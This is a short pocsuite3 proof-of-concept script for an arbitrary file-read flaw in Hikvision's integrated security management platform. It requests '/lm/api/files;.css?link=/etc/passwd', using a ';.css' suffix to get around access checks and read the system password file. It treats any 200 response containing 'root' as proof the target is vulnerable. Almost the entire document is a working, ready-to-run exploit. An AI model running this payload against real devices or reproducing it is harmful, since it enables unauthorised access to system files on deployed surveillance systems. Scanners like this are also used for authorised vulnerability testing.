# _*_ coding:utf-8 _*_
# @Time : 2023/12/30
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class haikang_files_fileread(POCBase):
    pocDesc = '''海康威视-综合安防管理平台-files-文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-30'
    name = '海康威视-综合安防管理平台-files-文件读取漏洞'

    def _verify(self):

        result = {}
        url = self.url + '/lm/api/files;.css?link=/etc/passwd'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'sec-ch-ua': '"Google Chrome";v="117", "Chromium";v="117", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9'
        }



        try:

            response = requests.get(url, headers=headers,verify=False)
            text = response.text
            if response.status_code == 200 and 'root' in text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(haikang_files_fileread)